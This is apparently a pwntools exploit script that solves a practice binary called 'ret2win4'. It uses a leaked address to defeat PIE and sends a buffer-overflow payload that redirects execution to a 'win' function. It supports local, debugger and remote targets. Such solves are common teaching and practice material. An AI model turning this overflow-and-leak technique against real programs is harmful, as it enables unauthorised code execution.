from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./ret2win4"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 120

io.recvuntil(b"you: ")

leak = int(io.recvline().strip(), 16)

log.info(f"Binary Leak : {hex(leak)}")

elf.address = leak - 0x404C
log.info(f"PIE Base : {hex(elf.address)}")

payload = flat({offset: [elf.sym["win"] + 5]})

io.sendline(payload)

io.interactive()
